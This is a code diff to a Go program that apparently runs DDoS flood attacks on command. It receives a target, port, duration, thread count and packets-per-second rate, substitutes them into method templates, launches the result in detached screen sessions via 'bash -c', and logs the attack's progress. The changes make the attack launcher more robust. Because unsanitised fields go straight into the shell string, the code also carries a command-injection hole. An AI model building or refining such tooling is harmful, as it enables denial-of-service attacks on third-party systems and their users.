@@ -3,8 +3,8 @@ package main
 import (
 	"context"
 	"fmt"
-	"os"
 	"os/exec"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -22,17 +22,33 @@ type attack struct {
 }
 
 func Attack(atk *AttackMessage) {
-	command := methods[strings.ToLower(atk.Data.Method)]
+	threads, _ := strconv.Atoi(atk.Options.Threads)
+	if threads > Config.MThread {
+		threads = Config.MThread
+		logger.Printf("Max Threads for servers auto-set to %d", Config.MThread)
+	}
+	atk.Options.Threads = strconv.Itoa(threads)
+	command, found := methods[strings.ToUpper(atk.Data.Method)]
+if !found {
+    logger.Println("Method not found:", atk.Data.Method)
+    return
+}
+cmdStr, ok := command.(string)
+if !ok {
+    logger.Println("Command is not a valid string:", command)
+    return
+}
 	replace := strings.NewReplacer(
 		"$target", atk.Data.Target,
-		"$threads", atk.Options.Threads,
+		"$threads", strconv.Itoa(threads),
 		"$port", atk.Data.Port,
 		"$time", atk.Data.Duration,
 		"$pps", atk.Options.PPS,
 	)
-	commandnew := replace.Replace(command)
-	//logger.Println(commandnew)
+	commandnew := replace.Replace(cmdStr)
+	logger.Println("Final command:", commandnew)
 	duration, _ := strconv.Atoi(atk.Data.Duration)
+
 	a := &attack{
 		user:    atk.Data.User,
 		target:  atk.Data.Target,
@@ -40,15 +56,44 @@ func Attack(atk *AttackMessage) {
 		created: time.Now().Unix(),
 		end:     time.Now().Unix() + int64(duration),
 	}
-	go a.flood(context.TODO())
+
+	go a.flood(context.TODO(), commandnew)
 }
 
-func (atk *attack) flood(ctx context.Context) {
-	cmd := exec.Command("bash", "-c", "screen -dmS "+fmt.Sprintf("%d@%s", atk.user, atk.target)+" "+atk.cmd+"")
-	logger.Println(cmd)
+func (atk *attack) flood(ctx context.Context, commandnew string) {
+    // Create the bash command string for starting the screen session.
+	cmdStr := fmt.Sprintf("screen -dmS Atk %s", commandnew)
+	logger.Println("Executing command:", cmdStr)
+
+	// Execute the bash command to start the attack in a detached screen session.
+	cmd := exec.Command("bash", "-c", cmdStr)
 	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
-	if err := cmd.Run(); err != nil {
-		logger.Println(err)
+	if err := cmd.Start(); err != nil {
+		logger.Println("Error executing command:", err)
+	} else {
+		currentDir, _ := os.Getwd()
+		logger.Println("Current working directory:", currentDir)
+		logger.Println("Successfully started attack on target:", atk.target)
 	}
-	logger.Println("succesfully started attack on \"" + atk.target + "\"")
+
+	// Start a new goroutine to monitor the attack status
+	go func() {
+		ticker := time.NewTicker(5 * time.Second)
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-ticker.C:
+				// Log periodic updates about the ongoing attack
+				logger.Println("Attack on target:", atk.target, "is still ongoing")
+				
+				// Check if the attack duration has passed
+				if time.Now().Unix() > atk.end {
+					// Attack has finished, log the end message
+					logger.Println("Attack finished on target:", atk.target)
+					return // Exit the goroutine once the attack is over
+				}
+			}
+		}
+	}()
 }
